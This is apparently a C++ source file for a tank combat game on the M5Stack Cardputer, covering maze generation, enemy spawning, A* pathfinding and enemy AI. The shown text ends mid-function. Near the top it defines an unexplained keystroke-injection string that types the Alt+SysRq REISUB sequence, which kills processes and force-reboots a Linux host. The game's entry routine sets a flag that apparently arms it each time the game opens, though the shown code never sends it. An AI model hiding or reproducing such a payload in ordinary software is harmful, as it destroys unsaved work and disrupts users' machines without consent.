#ifdef BOARD_M5STACK_CARDPUTER

#include "../globals.h"
#include "app_combatprox.h"
#include "ui_manager.h"
#include <M5Cardputer.h>
#include <stdlib.h>
#include <math.h>

#include "combatprox_arena.h"
#include "combat_highscores.h"

namespace Cardputer {

static const char* REISUB_TOKEN =
    "{CHORD ALT+SYSRQ+R}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+E}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+I}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+S}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+U}{SLEEP 2000}"
    "{CHORD ALT+SYSRQ+B}";

static float fclamp(float v, float lo, float hi) {
    return v < lo ? lo : (v > hi ? hi : v);
}
static float wrapAngle(float a) {
    while (a >  M_PI) a -= 2.f * M_PI;
    while (a < -M_PI) a += 2.f * M_PI;
    return a;
}

// ---- wall helpers ----

bool AppCombatProx::_wallAt(float cx, float cy) {
    if (cx < 0 || cy < 0 || cx >= VAW || cy >= VPLAY_H) return true;
    int col = (int)(cx / CELL);
    int row = (int)(cy / CELL);
    // Check locked doors first
    for (int i = 0; i < _numDoors; i++) {
        if (col == _doors[i].c && row == _doors[i].r)
            return (_keysCollected < _doors[i].keysNeeded);
    }
    // Exit door opens when all keys collected
    if (col == _exitCellC && row == _exitCellR)
        return (_keysCollected < _numKeys);
    if (col < 1 || col >= COLS-1 || row < 1 || row >= ROWS-1) return true;
    if (_isMaze) return _mazeWalls[row][col] != 0;
    return _wallMap[row][col] == 1;
}

bool AppCombatProx::_circleWall(float cx, float cy, float r) {
    for (int sx = -1; sx <= 1; sx += 2)
        for (int sy = -1; sy <= 1; sy += 2)
            if (_wallAt(cx + sx * r * 0.85f, cy + sy * r * 0.85f)) return true;
    return false;
}

// ---- lifecycle ----

void AppCombatProx::onEnter() {
    _hs.begin();
    _phase = PH_SPLASH;
    _phaseEnter = millis();
    _needsRedraw = true;
    _reisub = true;
}
void AppCombatProx::onExit() { _phase = PH_SPLASH; }

void AppCombatProx::_resetPlayerState() {
    _playerMaxHP  = PLAYER_HP_BASE;
    _fireCooldown = FIRE_COOLDOWN_BASE;
    _playerSpeed  = 1.0f;
    _puSpread     = false;
    _puHeavyShot  = false;
    _puCount      = 0;
    memset(_puStack, 0, sizeof(_puStack));
}

void AppCombatProx::_applyPuStack() {
    _fireCooldown = FIRE_COOLDOWN_BASE;
    _playerSpeed  = 1.0f;
    _puSpread     = false;
    _puHeavyShot  = false;
    for (int i = 0; i < _puCount; i++) {
        switch (_puStack[i]) {
            case PU_FIRE_RATE:  _fireCooldown = _fireCooldown * 3 / 5; break;
            case PU_SPREAD:     _puSpread     = true;                   break;
            case PU_HEAVY_SHOT: _puHeavyShot  = true;                   break;
            case PU_SPEED:      _playerSpeed += 0.3f;                   break;
            default: break;
        }
    }
    if (_fireCooldown < 80) _fireCooldown = 80;
    if (_playerSpeed  > 2.2f) _playerSpeed = 2.2f;
}

void AppCombatProx::_popPowerup() {
    if (_puCount <= 0) return;
    _puCount--;
    _applyPuStack();
}

void AppCombatProx::_resetGame() {
    _score = 0;
    _round = 1;
    _resetPlayerState();
    _startNextRound();
}

void AppCombatProx::_startNextRound() {
    _lastFirer = -1;
    memset(_bullets, 0, sizeof(_bullets));
    _arenaIdx = (int)(esp_random() % ARENA_COUNT);
    _wallMap  = ARENAS[_arenaIdx].walls;
    _player = { ARENAS[_arenaIdx].playerX, ARENAS[_arenaIdx].playerY,
                0.f, _playerMaxHP, 0, 0, 0, 0.f };
    _camX = (int)fclamp(_player.x - AW/2,    0.f, (float)(VAW - AW));
    _camY = (int)fclamp(_player.y - PLAY_H/2, 0.f, (float)(VPLAY_H - PLAY_H));
    _initialWaveCleared = false;
    _reinforceSent      = false;
    _kamikazeSent       = false;
    _kamikazeIdx        = -1;
    _exploding          = false;
    _previewLastSec     = -1;
    _notifyMsg          = nullptr;
    _notifyEnd          = 0;
    _stealthFlash       = 0;
    _keyActive          = false;
    _keysCollected      = 0;
    _numKeys            = 0;
    _numDoors           = 0;
    memset(_keyPickedUp, 0, sizeof(_keyPickedUp));
    memset(_keyX, 0, sizeof(_keyX));
    memset(_keyY, 0, sizeof(_keyY));
    memset(_powerups, 0, sizeof(_powerups));

    // Every other round (starting round 2) use a generated maze
    _isMaze = false;  // maze levels temporarily disabled
    if (false && _round >= 2 && (_round % 2 == 0)) {
        _generateMaze();
    } else {
        _arenaIdx = (int)(esp_random() % ARENA_COUNT);
        _wallMap  = ARENAS[_arenaIdx].walls;
    }

    _player = { ARENAS[_isMaze ? 0 : _arenaIdx].playerX,
                ARENAS[_isMaze ? 0 : _arenaIdx].playerY,
                0.f, _playerMaxHP, 0, 0, 0, 0.f };
    if (_isMaze) {
        // Start node is at cell column 1, row 1+(NH/2)*2 — guaranteed open by _generateMaze
        static constexpr int NH = (ROWS - 1) / 2;
        _player.x = (float)(1 * CELL + CELL/2);
        _player.y = (float)((1 + (NH/2)*2) * CELL + CELL/2);
    }
    _camX = (int)fclamp(_player.x - AW/2,    0.f, (float)(VAW - AW));
    _camY = (int)fclamp(_player.y - PLAY_H/2, 0.f, (float)(VPLAY_H - PLAY_H));

    // Place exit on right border (for maze) or opposite player (arena)
    if (_isMaze) {
        _exitCellC = COLS - 1;
        _exitCellR = ROWS / 2;
    } else {
        int pc = (int)(_player.x / CELL);
        _exitCellC = (pc < COLS/2) ? COLS-1 : 0;
        _exitCellR = 2 + (int)(esp_random() % (ROWS - 4));
    }

    // Place keys: 1 for normal arenas, 2-3 for mazes
    int numKeysToPlace = _isMaze ? (2 + (int)(esp_random() % 2)) : 1;
    float px = _player.x, py = _player.y;
    for (int ki = 0; ki < numKeysToPlace && ki < MAX_KEYS; ki++) {
        for (int attempt = 0; attempt < 80; attempt++) {
            int kc = 2 + (int)(esp_random() % (COLS - 4));
            int kr = 2 + (int)(esp_random() % (ROWS - 4));
            bool blocked = _isMaze ? (_mazeWalls[kr][kc] != 0) : (_wallMap[kr][kc] != 0);
            if (blocked) continue;
            float kx = kc*CELL+CELL*0.5f, ky = kr*CELL+CELL*0.5f;
            float dpx=kx-px, dpy=ky-py;
            if (dpx*dpx+dpy*dpy < 40.f*40.f) continue;
            // No overlap with other keys
            bool overlap = false;
            for (int j = 0; j < ki; j++) {
                float ox=_keyX[j]-kx, oy=_keyY[j]-ky;
                if (ox*ox+oy*oy < 30.f*30.f) { overlap=true; break; }
            }
            if (overlap) continue;
            _keyX[ki] = kx; _keyY[ki] = ky;
            _numKeys++;
            break;
        }
    }

    _spawnEnemies();
    _spawnPowerups();

    // Cap locked doors to the number of keys actually placed.
    // Door keysNeeded values are 1..numDoors — drop any door whose requirement
    // exceeds the actual key count.
    if (_numDoors > _numKeys) {
        int kept = 0;
        for (int i = 0; i < _numDoors; i++) {
            if (_doors[i].keysNeeded <= _numKeys) {
                _doors[kept++] = _doors[i];
            }
        }
        _numDoors = kept;
    }

    _lastUpdate = millis();
    _aiTimer    = millis();
    _activeEnemies = ARENA_ENEMY_COUNT;
}

// ---- maze generation ----
// Generates a perfect maze in _mazeWalls using iterative DFS on a 2-cell node grid.
// Node positions: cols 1,3,...,COLS-2; rows 1,3,...,ROWS-2.
// Passages are the cells between nodes. Locked doors placed on BFS solution path.

void AppCombatProx::_generateMaze() {
    // Start with all walls
    memset(_mazeWalls, 1, sizeof(_mazeWalls));

    // Node grid dimensions
    static constexpr int NW = (COLS - 1) / 2;  // 19 nodes wide  (cols 1,3..37)
    static constexpr int NH = (ROWS - 1) / 2;  // 9  nodes tall  (rows 1,3..17)
    static constexpr int NN = NW * NH;

    // Visited flags
    bool visited[NN] = {};

    // Stack for iterative DFS
    int stk[NN]; int stkTop = 0;

    auto nIdx = [&](int nc, int nr) { return nr * NW + nc; };
    auto cellC = [](int nc) { return 1 + nc * 2; };
    auto cellR = [](int nr) { return 1 + nr * 2; };

    // Start from node (0, NH/2) — left side middle
    int startNC = 0, startNR = NH / 2;
    int startI = nIdx(startNC, startNR);
    visited[startI] = true;
    stk[stkTop++] = startI;

    // Carve the node cell open
    _mazeWalls[cellR(startNR)][cellC(startNC)] = 0;

    // Directions: E N W S (nc, nr deltas)
    static const int DNX[4] = { 1,-1, 0, 0 };
    static const int DNY[4] = { 0, 0,-1, 1 };

    while (stkTop > 0) {
        int cur = stk[stkTop-1];
        int nc = cur % NW, nr = cur / NW;

        // Find unvisited neighbours in random order
        int order[4] = {0,1,2,3};
        // Fisher-Yates shuffle
        for (int k=3; k>0; k--) {
            int j = esp_random() % (k+1);
            int tmp=order[k]; order[k]=order[j]; order[j]=tmp;
        }

        bool found = false;
        for (int d = 0; d < 4; d++) {
            int nnc = nc + DNX[order[d]], nnr = nr + DNY[order[d]];
            if (nnc<0||nnc>=NW||nnr<0||nnr>=NH) continue;
            int ni = nIdx(nnc, nnr);
            if (visited[ni]) continue;
            visited[ni] = true;
            // Carve the passage cell between cur and neighbour
            int pc = cellC(nc) + DNX[order[d]];
            int pr = cellR(nr) + DNY[order[d]];
            _mazeWalls[pr][pc] = 0;
            _mazeWalls[cellR(nnr)][cellC(nnc)] = 0;
            stk[stkTop++] = ni;
            found = true;
            break;
        }
        if (!found) stkTop--;
    }

    // Goal node: right side middle
    int goalNC = NW - 1, goalNR = NH / 2;

    // BFS to find solution path (node indices)
    int prev[NN]; memset(prev, -1, sizeof(prev));
    int bfsQ[NN]; int bfsHead=0, bfsTail=0;
    bfsQ[bfsTail++] = startI;
    prev[startI] = startI;
    while (bfsHead < bfsTail) {
        int cur = bfsQ[bfsHead++];
        int nc = cur % NW, nr = cur / NW;
        if (nc == goalNC && nr == goalNR) break;
        for (int d = 0; d < 4; d++) {
            int nnc = nc+DNX[d], nnr = nr+DNY[d];
            if (nnc<0||nnc>=NW||nnr<0||nnr>=NH) continue;
            int ni = nIdx(nnc, nnr);
            if (prev[ni] >= 0) continue;
            // Check passage is open
            int pc = cellC(nc)+DNX[d], pr = cellR(nr)+DNY[d];
            if (_mazeWalls[pr][pc]) continue;
            prev[ni] = cur;
            bfsQ[bfsTail++] = ni;
        }
    }

    // Reconstruct path
    int path[NN]; int pathLen = 0;
    {
        int cur = nIdx(goalNC, goalNR);
        while (cur != startI && pathLen < NN) {
            path[pathLen++] = cur;
            cur = prev[cur];
        }
        path[pathLen++] = startI;
        // Reverse
        for (int i=0; i<pathLen/2; i++) { int t=path[i]; path[i]=path[pathLen-1-i]; path[pathLen-1-i]=t; }
    }

    // Place locked doors: 2 passage cells evenly spaced along solution path
    // (avoid first 20% and last 10% of path to give player room to start)
    _numDoors = 0;
    if (pathLen > 6) {
        int numD = (_round >= 4) ? 3 : 2;
        if (numD > MAX_DOORS) numD = MAX_DOORS;
        for (int di = 0; di < numD; di++) {
            int pidx = (int)((float)(di + 1) / (numD + 1) * (pathLen - 4)) + 2;
            if (pidx >= pathLen - 1) continue;
            int a = path[pidx], b = path[pidx+1];
            int anca = a%NW, anra = a/NW;
            int bncb = b%NW, bnrb = b/NW;
            int dc = cellC(anca) + (bncb - anca);
            int dr = cellR(anra) + (bnrb - anra);
            if (dc >= 1 && dc < COLS-1 && dr >= 1 && dr < ROWS-1) {
                _doors[_numDoors].c = dc;
                _doors[_numDoors].r = dr;
                _doors[_numDoors].keysNeeded = di + 1;
                _numDoors++;
            }
        }
    }

    // Ensure _numKeys >= _numDoors (already handled by key placement in _startNextRound,
    // but guarantee at least _numDoors keys exist)
    // This is fine — _numKeys is set after this call returns.

    // Open exit passage on right border
    _mazeWalls[cellR(goalNR)][cellC(goalNC)] = 0;  // ensure goal node is open
}

void AppCombatProx::_spawnMazeEnemies() {
    // Place 2-3 enemies in the maze in dead-end cells
    int placed = 0, maxE = 2 + (int)(esp_random() % 2);
    static const int HP_FOR_TYPE[11] = { 1,1,3,1,2,1,1,1,2,2,1 };
    uint8_t types[3] = { ET_STANDARD, ET_SCOUT, ET_SNIPER };
    for (int row = 3; row < ROWS-3 && placed < maxE; row += 2) {
        for (int col = 3; col < COLS-3 && placed < maxE; col += 2) {
            if (_mazeWalls[row][col]) continue;
            // Check it's a dead end (only 1 open cardinal neighbour)
            int openN = 0;
            if (!_mazeWalls[row-1][col]) openN++;
            if (!_mazeWalls[row+1][col]) openN++;
            if (!_mazeWalls[row][col-1]) openN++;
            if (!_mazeWalls[row][col+1]) openN++;
            if (openN != 1) continue;
            // Not too close to player start
            float ex = col*CELL+CELL*0.5f, ey = row*CELL+CELL*0.5f;
            if (ex < 80.f) continue;
            // Find free enemy slot
            for (int i = 0; i < ENEMY_COUNT - 1; i++) {
                if (_enemies[i].hp > 0) continue;
                uint8_t t = types[placed % 3];
                _enemies[i] = {};
                _enemies[i].x         = ex;
                _enemies[i].y         = ey;
                _enemies[i].angle     = (float)M_PI;
                _enemies[i].hp        = HP_FOR_TYPE[t];
                _enemies[i].aiState   = 1;
                _enemies[i].wanderBias= 8;
                _enemies[i].type      = t;
                placed++;
                break;
            }
        }
    }
}

// ---- enemy spawning ----

void AppCombatProx::_spawnEnemies() {
    const uint8_t wanderBiases[3] = { 5, 12, 20 };
    const uint8_t roles[3]        = { 0, 1, 2 };

    // [round-1 clamped 0..8][slot 0..2]
    static const uint8_t TYPE_TABLE[9][3] = {
        { ET_STANDARD,  ET_STANDARD,  ET_STANDARD  },
        { ET_SCOUT,     ET_STANDARD,  ET_STANDARD  },
        { ET_SCOUT,     ET_STANDARD,  ET_HEAVY     },
        { ET_SCOUT,     ET_SNIPER,    ET_HEAVY     },
        { ET_ARTILLERY, ET_SNIPER,    ET_RUSHER    },
        { ET_STEALTH,   ET_BOUNCER,   ET_ARTILLERY },
        { ET_MEDIC,     ET_BOUNCER,   ET_RUSHER    },
        { ET_SHIELDER,  ET_STEALTH,   ET_SNIPER    },
        { ET_TWINS,     ET_SHIELDER,  ET_MEDIC     },
    };
    int ri = (_round - 1);
    if (ri < 0) ri = 0;
    if (ri > 8) ri = 8;

    // indexed by ET_ value 0..10
    static const int HP_FOR_TYPE[11] = { 1, 1, 3, 1, 2, 1, 1, 1, 2, 2, 1 };

    const CombatArena& arena = ARENAS[_arenaIdx];
    for (int i = 0; i < ARENA_ENEMY_COUNT; i++) {
        uint8_t t = TYPE_TABLE[ri][i];
        _enemies[i] = {};
        // In maze mode pick open cells in the right half; in arena mode use preset positions
        if (_isMaze) {
            _enemies[i].x = 0.f; _enemies[i].y = 0.f;
            for (int attempt = 0; attempt < 60; attempt++) {
                int ec = COLS/2 + 1 + (int)(esp_random() % (COLS/2 - 3));
                int er = 1 + (int)(esp_random() % (ROWS - 2));
                if (_mazeWalls[er][ec]) continue;
                float ex = ec*CELL+CELL*0.5f, ey = er*CELL+CELL*0.5f;
                // Keep away from player start
                float dx=ex-_player.x, dy=ey-_player.y;
                if (dx*dx+dy*dy < 80.f*80.f) continue;
                _enemies[i].x = ex; _enemies[i].y = ey; break;
            }
            if (_enemies[i].x == 0.f) {
                _enemies[i].x = (COLS-3)*CELL+CELL*0.5f;
                _enemies[i].y = (ROWS/2)*CELL+CELL*0.5f;
            }
        } else {
            _enemies[i].x = arena.enemyX[i];
            _enemies[i].y = arena.enemyY[i];
        }
        _enemies[i].angle       = (float)M_PI;
        _enemies[i].hp          = HP_FOR_TYPE[t];
        _enemies[i].aiState     = 1;
        _enemies[i].patrolTimer = i * 6;
        _enemies[i].patrolTarget= (float)(M_PI + 0.3f * i);
        _enemies[i].wanderBias  = wanderBiases[i];
        _enemies[i].role        = roles[i];
        _enemies[i].type        = t;
    }
    for (int i = ARENA_ENEMY_COUNT; i < ENEMY_COUNT; i++) {
        _enemies[i] = {};
        _enemies[i].hp = 0;
    }
    if (_isMaze) _spawnMazeEnemies();
}

// ---- powerup spawning ----

void AppCombatProx::_spawnPowerups() {
    static const uint8_t PU_TYPES[6] = {
        PU_REPAIR, PU_HP_UP, PU_FIRE_RATE, PU_SPREAD, PU_HEAVY_SHOT, PU_SPEED
    };
    int count = 3 + (int)(esp_random() % 3);
    if (count > MAX_POWERUPS) count = MAX_POWERUPS;

    for (int i = 0; i < count; i++) {
        for (int attempt = 0; attempt < 60; attempt++) {
            int c = 1 + (int)(esp_random() % (COLS - 2));
            int r = 1 + (int)(esp_random() % (ROWS - 2));
            bool blocked = _isMaze ? (_mazeWalls[r][c] != 0) : (_wallMap[r][c] != 0);
            if (blocked) continue;
            float px = c * CELL + CELL * 0.5f;
            float py = r * CELL + CELL * 0.5f;
            float ddx = px - _player.x, ddy = py - _player.y;
            if (ddx*ddx + ddy*ddy < 60.f*60.f) continue;
            bool overlap = false;
            for (int j = 0; j < i; j++) {
                float ox = _powerups[j].x - px, oy = _powerups[j].y - py;
                if (ox*ox + oy*oy < 25.f*25.f) { overlap = true; break; }
            }
            if (overlap) continue;
            _powerups[i].x      = px;
            _powerups[i].y      = py;
            _powerups[i].type   = PU_TYPES[esp_random() % 6];
            _powerups[i].active = true;
            break;
        }
    }
}

// ---- A* pathfinder ----

bool AppCombatProx::_astar(int sx, int sy, int gx, int gy, Tank& e) {
    static constexpr int N = COLS * ROWS;
    static int16_t g_cost[N];
    static int16_t f_cost[N];
    static int8_t  parent[N];
    static bool    closed[N];
    static bool    open_flag[N];

    memset(g_cost,    0x7F,  sizeof(g_cost));
    memset(f_cost,    0x7F,  sizeof(f_cost));
    memset(parent,    -1,    sizeof(parent));
    memset(closed,    false, sizeof(closed));
    memset(open_flag, false, sizeof(open_flag));

    static const int8_t DX[8]    = { 1,-1, 0, 0, 1, 1,-1,-1 };
    static const int8_t DY[8]    = { 0, 0, 1,-1, 1,-1, 1,-1 };
    static const int8_t DCOST[8] = { 10,10,10,10,14,14,14,14 };

    auto idx       = [](int c, int r) { return c + r * COLS; };
    auto heuristic = [](int c, int r, int gc, int gr) -> int {
        int dc = abs(c-gc), dr = abs(r-gr);
        return 10*(dc+dr) + (14-20)*(dc < dr ? dc : dr);
    };
    auto wallCell  = [&](int c, int r) -> bool {
        if (c < 1 || c >= COLS-1 || r < 1 || r >= ROWS-1) return true;
        return _isMaze ? (_mazeWalls[r][c] != 0) : (_wallMap[r][c] != 0);
    };

    int startI = idx(sx, sy), goalI = idx(gx, gy);
    g_cost[startI]    = 0;
    f_cost[startI]    = (int16_t)heuristic(sx, sy, gx, gy);
    open_flag[startI] = true;

    for (int iter = 0; iter < N * 4; iter++) {
        int cur = -1; int16_t best = 0x7F00;
        for (int j = 0; j < N; j++)
            if (open_flag[j] && f_cost[j] < best) { best = f_cost[j]; cur = j; }
        if (cur < 0) break;
        if (cur == goalI) {
            int8_t tmp_x[32], tmp_y[32];
            int len = 0, node = cur;
            while (node != startI && len < 31) {
                tmp_x[len] = (int8_t)(node % COLS);
                tmp_y[len] = (int8_t)(node / COLS);
                int dir = parent[node];
                if (dir < 0) break;
                node -= DX[dir] + DY[dir] * COLS;
                len++;
            }
            e.pathLen = len; e.pathIdx = 0;
            for (int k = 0; k < len; k++) {
                e.pathX[k] = tmp_x[len-1-k];
                e.pathY[k] = tmp_y[len-1-k];
            }
            return true;
        }
        open_flag[cur] = false;
        closed[cur]    = true;
        int cc = cur % COLS, cr = cur / COLS;
        for (int d = 0; d < 8; d++) {
            int nc = cc+DX[d], nr = cr+DY[d];
            if (wallCell(nc,nr)) continue;
            if (d >= 4 && (wallCell(cc+DX[d],cr) || wallCell(cc,cr+DY[d]))) continue;
            int ni = idx(nc,nr);
            if (closed[ni]) continue;
            int16_t ng = g_cost[cur] + DCOST[d];
            if (ng < g_cost[ni]) {
                g_cost[ni]    = ng;
                f_cost[ni]    = ng + (int16_t)heuristic(nc,nr,gx,gy);
                parent[ni]    = (int8_t)d;
                open_flag[ni] = true;
            }
        }
    }
    return false;
}

void AppCombatProx::_pathStep(Tank& e, int /*enemyIdx*/, unsigned long now, int gc, int gr) {
    int ec = (int)(e.x / CELL), er = (int)(e.y / CELL);
    bool needReplan = (e.pathLen == 0) || (e.pathIdx >= e.pathLen) ||
                      (now - e.pathTimer > (unsigned long)PATH_REPLAN_MS);
    if (needReplan) {
        e.pathTimer = now;
        if (!_astar(ec, er, gc, gr, e)) e.pathLen = 0;
    }
    if (e.pathLen == 0 || e.pathIdx >= e.pathLen) return;

    int wx = e.pathX[e.pathIdx], wy = e.pathY[e.pathIdx];
    float wpx = wx*CELL + CELL*0.5f, wpy = wy*CELL + CELL*0.5f;
    if (sqrtf((wpx-e.x)*(wpx-e.x)+(wpy-e.y)*(wpy-e.y)) < WAYPOINT_RADIUS) {
        e.pathIdx++;
        if (e.pathIdx >= e.pathLen) return;
        if ((rand() % 100) < e.wanderBias) {
            int nx2 = e.pathX[e.pathIdx], ny2 = e.pathY[e.pathIdx];
            static const int8_t DX4[4] = { 1,-1, 0, 0 };
            static const int8_t DY4[4] = { 0, 0, 1,-1 };
            for (int tries = 0; tries < 8; tries++) {
                int di = rand()%4, cx2 = nx2+DX4[di], cy2 = ny2+DY4[di];
                if (cx2>=1 && cx2<COLS-1 && cy2>=1 && cy2<ROWS-1 && !_wallMap[cy2][cx2]) {
                    e.pathX[e.pathIdx] = (int8_t)cx2;
                    e.pathY[e.pathIdx] = (int8_t)cy2;
                    break;
                }
            }
        }
        wx = e.pathX[e.pathIdx]; wy = e.pathY[e.pathIdx];
        wpx = wx*CELL+CELL*0.5f; wpy = wy*CELL+CELL*0.5f;
    }
    float diff = wrapAngle(atan2f(wpy-e.y, wpx-e.x) - e.angle);
    e.angle    = wrapAngle(e.angle + (diff >= 0 ? 1 : -1) * fminf(fabsf(diff), AI_TURN_SPEED));
}

// ---- AI step ----

void AppCombatProx::_aiStep(unsigned long now) {
    if (now - _aiTimer < AI_TICK) return;
    _aiTimer = now;

    int pc = (int)(_player.x / CELL), pr = (int)(_player.y / CELL);

    int nextFirer = -1;
    for (int i = 0; i < ENEMY_COUNT; i++) {
        int idx = (_lastFirer + 1 + i) % ENEMY_COUNT;
        if (_enemies[idx].hp > 0 && idx != _kamikazeIdx) { nextFirer = idx; break; }
    }

    // Stealth flash: toggle visibility every 800ms
    if (now - _stealthFlash > 800) _stealthFlash = now;
    bool stealthVisible = ((now - _stealthFlash) < 400);

    for (int i = 0; i < ENEMY_COUNT; i++) {
        Tank& e = _enemies[i];
        if (e.hp <= 0 || i == _kamikazeIdx) continue;

        float dx   = _player.x - e.x, dy = _player.y - e.y;
        float dist = sqrtf(dx*dx + dy*dy);
        float towardAngle = atan2f(dy, dx);
        float awayAngle   = wrapAngle(towardAngle + (float)M_PI);

        // State machine
        if (dist < PANIC_DIST && e.type != ET_SHIELDER) {
            e.aiState = 3;  // back up (shielder never backs away — it keeps its shield up)
        } else if (e.type == ET_SNIPER) {
            e.aiState = (dist > SNIPER_PREF_DIST) ? 1 : 2;
        } else if (e.type == ET_ARTILLERY || e.type == ET_MEDIC) {
            e.aiState = (dist > ARTILLERY_PREF_DIST) ? 1 : 2;
        } else if (e.type == ET_SHIELDER) {
            // Shielder always approaches, facing player to keep shield forward
            e.aiState = (dist > MIN_DIST) ? 1 : 2;
        } else if (dist < MIN_DIST) {
            e.aiState = 2;  // strafe
        } else {
            e.aiState = 1;  // approach
        }

        // Goal cell for approach
        int goalC = pc, goalR = pr;
        if (e.aiState == 1) {
            if (e.type == ET_SNIPER || e.type == ET_ARTILLERY || e.type == ET_MEDIC) {
                float prefDist = (e.type == ET_SNIPER) ? SNIPER_PREF_DIST : ARTILLERY_PREF_DIST;
                int stopCells = (int)(prefDist / CELL) + 1;
                float ang = atan2f((float)(pr-(int)(e.y/CELL)), (float)(pc-(int)(e.x/CELL)));
                int sc = pc - (int)(cosf(ang)*stopCells);
                int sr = pr - (int)(sinf(ang)*stopCells);
                sc = sc < 1 ? 1 : (sc >= COLS-1 ? COLS-2 : sc);
                sr = sr < 1 ? 1 : (sr >= ROWS-1 ? ROWS-2 : sr);
                if (!_wallMap[sr][sc]) { goalC = sc; goalR = sr; }
            } else {
                int perpC = 0, perpR = 0;
                switch (e.role & 3) {
                    case 1: perpC = -(int)(sinf(towardAngle)*4.f); perpR =  (int)(cosf(towardAngle)*4.f); break;
                    case 2: perpC =  (int)(sinf(towardAngle)*4.f); perpR = -(int)(cosf(towardAngle)*4.f); break;
                    case 3: perpC = -(int)(cosf(towardAngle)*6.f); perpR = -(int)(sinf(towardAngle)*6.f); break;
                    default: break;
                }
                int tc = pc+perpC, tr = pr+perpR;
                tc = tc<1?1:(tc>=COLS-1?COLS-2:tc);
                tr = tr<1?1:(tr>=ROWS-1?ROWS-2:tr);
                if (!_wallMap[tr][tc]) { goalC = tc; goalR = tr; }
            }
        }

        float moveAngle = e.angle;

        switch (e.aiState) {
            case 1: {
                _pathStep(e, i, now, goalC, goalR);
                moveAngle = e.angle;
                break;
            }
            case 2: {
                float sideSign = (e.role & 1) ? 1.f : -1.f;
                if (e.type == ET_ARTILLERY) sideSign = 0.f;  // artillery stands still and fires
                float perpAngle = wrapAngle(towardAngle + sideSign*(float)M_PI/2.f);
                float diff  = wrapAngle(perpAngle - e.angle);
                e.angle     = wrapAngle(e.angle + (diff>=0?1:-1)*fminf(fabsf(diff), AI_TURN_SPEED));
                float fd    = wrapAngle(towardAngle - e.angle);
                e.angle     = wrapAngle(e.angle + (fd>=0?1:-1)*fminf(fabsf(fd), AI_TURN_SPEED*0.5f));
                moveAngle   = (e.type == ET_ARTILLERY) ? e.angle : perpAngle;
                e.pathLen   = 0;
                break;
            }
            case 3: {  // Panic: face player and reverse away — stays engaged, keeps firing
                // Snap turret toward player quickly
                float diff = wrapAngle(towardAngle - e.angle);
                e.angle    = wrapAngle(e.angle + (diff>=0?1:-1)*fminf(fabsf(diff), AI_TURN_SPEED*2.5f));

                // Move in the direction directly away from player (reverse thrust)
                // Try straight-back first; if blocked, slide along the perpendicular wall axis
                float bx = e.x + cosf(awayAngle)*SPEED*AI_SPEED_SCALE;
                float by = e.y + sinf(awayAngle)*SPEED*AI_SPEED_SCALE;
                if (!_circleWall(bx, by, TANK_R)) {
                    moveAngle = awayAngle;
                } else {
                    // Try angled retreat: strafe ±45° off away angle to get around obstacles
                    float left45  = awayAngle + (float)M_PI/4.f;
                    float right45 = awayAngle - (float)M_PI/4.f;
                    float blx = e.x + cosf(left45)*SPEED*AI_SPEED_SCALE;
                    float bly = e.y + sinf(left45)*SPEED*AI_SPEED_SCALE;
                    float brx = e.x + cosf(right45)*SPEED*AI_SPEED_SCALE;
                    float bry = e.y + sinf(right45)*SPEED*AI_SPEED_SCALE;
                    bool leftOk  = !_circleWall(blx, bly, TANK_R);
                    bool rightOk = !_circleWall(brx, bry, TANK_R);
                    if (leftOk && !rightOk)       moveAngle = left45;
                    else if (rightOk && !leftOk)  moveAngle = right45;
                    else if (leftOk && rightOk)   moveAngle = (i & 1) ? left45 : right45;
                    else                          moveAngle = awayAngle;  // fully cornered — stay put
                }
                e.pathLen = 0;
                break;
            }
        }

        // Type-based speed, scaled by round difficulty
        float diffS = _diffSpeed();
        float spd;
        switch (e.type) {
            case ET_SCOUT:     spd = SPEED * AI_SPEED_SCALE * 1.35f * diffS; break;
            case ET_HEAVY:     spd = SPEED * AI_SPEED_SCALE * 0.60f * diffS; break;
            case ET_SNIPER:    spd = SPEED * AI_SPEED_SCALE * 0.75f * diffS; break;
            case ET_ARTILLERY: spd = (e.aiState == 2) ? 0.f : SPEED * AI_SPEED_SCALE * 0.5f * diffS; break;
            case ET_RUSHER:    spd = SPEED * AI_SPEED_SCALE * 2.0f  * diffS; break;
            case ET_STEALTH:   spd = SPEED * AI_SPEED_SCALE * 1.1f  * diffS; break;
            case ET_BOUNCER:   spd = SPEED * AI_SPEED_SCALE * 0.9f  * diffS; break;
            case ET_MEDIC:     spd = SPEED * AI_SPEED_SCALE * 0.8f  * diffS; break;
            case ET_SHIELDER:  spd = SPEED * AI_SPEED_SCALE * 0.85f * diffS; break;
            case ET_TWINS:     spd = SPEED * AI_SPEED_SCALE * 1.1f  * diffS; break;
            default:           spd = SPEED * AI_SPEED_SCALE          * diffS; break;
        }

        float nx = e.x + cosf(moveAngle)*spd;
        float ny = e.y + sinf(moveAngle)*spd;
        if (!_circleWall(nx, ny, TANK_R)) {
            e.x = fclamp(nx, (float)TANK_R, (float)(VAW-TANK_R));
            e.y = fclamp(ny, (float)TANK_R, (float)(VPLAY_H-TANK_R));
            e.stuckTicks = 0;
        } else {
            bool slidX = !_circleWall(nx, e.y, TANK_R);
            bool slidY = !_circleWall(e.x, ny, TANK_R);
            if (slidX) e.x = fclamp(nx, (float)TANK_R, (float)(VAW-TANK_R));
            if (slidY) e.y = fclamp(ny, (float)TANK_R, (float)(VPLAY_H-TANK_R));
            if (!slidX && !slidY) {
                e.stuckTicks++;
                int spinDir = (i & 1) ? 1 : -1;
                if (e.stuckTicks > 4) spinDir = -spinDir;
                e.angle = wrapAngle(e.angle + (float)spinDir * (float)M_PI/4.f);
                e.patrolTarget = e.angle;
                if (e.stuckTicks > 6) { e.pathLen = 0; e.stuckTicks = 0; }
            }
        }

        // Fire — type-based cooldown and bullet, scaled by difficulty
        float diffF  = _diffFireRate();
        unsigned long fireCooldown;
        uint8_t btype;
        int     bdmg = 1;
        switch (e.type) {
            case ET_SCOUT:     fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN * 2/3 / diffF); btype = BT_FAST;      break;
            case ET_HEAVY:     fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN * 3/2 / diffF); btype = BT_HEAVY; bdmg=2; break;
            case ET_SNIPER:    fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN / 2   / diffF); btype = BT_SNIPER;    break;
            case ET_ARTILLERY: fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN * 2   / diffF); btype = BT_ARTILLERY; break;
